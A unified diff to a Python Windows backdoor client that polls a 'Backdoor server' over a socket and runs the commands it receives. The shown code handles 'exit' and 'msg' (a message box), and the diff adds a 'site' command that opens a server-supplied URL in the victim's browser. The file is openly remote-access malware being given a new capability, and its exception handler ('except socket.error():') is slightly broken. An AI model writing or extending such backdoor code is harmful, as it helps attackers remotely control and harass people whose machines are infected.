@@ -18,6 +18,8 @@ import ctypes
 import subprocess
 import threading
 from wmi import WMI
+import webbrowser
+
 
 import win32api
 import winerror
@@ -128,13 +130,18 @@ while True:
             strData = recv(intBuffer)
             strData = decode_utf8(strData)
 
-            # exit command received from Backdoor server
+            # --x, Exit command received from Backdoor server
             if strData == 'exit':
                 objSocket.close() # noqa
                 exit(0)
 
+            # --m, Message received from the Backdoor server
             elif strData[:3] == 'msg':
                 MessageBox(strData[4:])
+
+            # --o, Open received URL from the Backdoor server in Backdoor Client Browser
+            elif strData[:4] == 'site':
+                webbrowser.get().open(strData[4:])
 
     # Handle if Backdoor Server not Responding try to Reconnect to Server
     except socket.error():
